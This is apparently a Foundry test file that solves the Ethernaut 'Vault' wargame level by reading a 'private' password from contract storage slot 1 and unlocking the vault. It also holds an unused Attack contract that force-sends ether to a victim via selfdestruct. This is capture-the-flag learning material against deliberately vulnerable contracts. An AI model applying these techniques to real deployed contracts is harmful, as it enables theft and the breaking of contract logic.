pragma solidity >=0.8.19;

import { Test } from "forge-std/Test.sol";
import { Vault } from "src/Vault/Vault.sol";
import { VaultFactory } from "src/Vault/VaultFactory.sol";
import { Ethernaut } from "src/Ethernaut.sol";

contract Attack {
    address victim;

    constructor(address _victim) {
        victim = _victim;
    }

    fallback() external payable {
        selfdestruct(payable(victim));
    }
}

contract VaultTest is Test {
    Ethernaut ethernaut;
    address me = makeAddr("me");

    function setUp() external {
        ethernaut = new Ethernaut();
    }

    function testVaultHack() external {
        // level setup
        VaultFactory factory = new VaultFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(me);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Vault vault = Vault(payable(levelAddress));

        // attack
        bytes32 password = vm.load(address(vault), bytes32(uint256(1)));
        vault.unlock(password);

        // submission
        bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelPassed);
    }
}
